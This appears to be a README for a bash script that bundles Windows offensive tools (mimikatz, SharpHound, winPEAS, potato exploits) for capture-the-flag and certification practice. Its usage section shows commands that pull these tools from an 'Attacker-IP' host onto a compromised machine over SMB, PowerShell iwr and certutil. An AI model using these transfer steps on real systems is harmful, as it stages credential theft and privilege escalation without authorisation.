# ExploitationBundle
Bash script that automates the downloading of various exploitation tools. The purpose for this tool is to automate the process of populating your current folder with the different tools you are most likely going to transfer to the target. 

Useful for hacking CTF like machines, HTB, THM and preparing for hacking certifications.

## What Tools does it include?
At the moment this tool will only fetch windows resources. These are: mimikatz (post-exploitation), chisel (for pivoting), powerup (privesc), powerview (privesc, lateral movement), sharphound (privesc, lateral movement), winPEAS (enumeration), conpty (shell with autocomplete), psexec, ghostpack compiled binaries(various exploitation tools) and a few different potato exploit binaries (privesc).

## Dependencies
You will need wget and, as an optional tool, impacket. Both tools will probably already be installed in your machine, if not you can use the following command in your kali to get both:

```bash
sudo apt install wget && sudo apt install impacket-scripts
```

## Usage
Make a 'tools' directory and inside run the script:

```bash
mkdir tools

cd tools
```

### File Transfer - SMB

Once these tools have been downloaded, *if SMB is enabled in the machine*, I suggest starting an impacket-smbserver within 'tools':

```bash
impacket-smbserver tools . -smb2support
```

Now go back to your windows reverse shell, you will be able to copy these tools with these commands:

```cmd
copy \\Attacker-IP\tools\* .

copy \\Attacker-IP\tools\Ghostpack-CompiledBinaries\* .
```

If you need any other tools remember you can start your smb server inside that folder to make them available for transfer.

### File Transfer - HTTP

On Powershell:

```powershell
iwr -Uri http://Attacker-IP/example -OutFile example
```

On CMD:

```cmd
certutil -urlcache -f http://Attacker-IP/example example
```
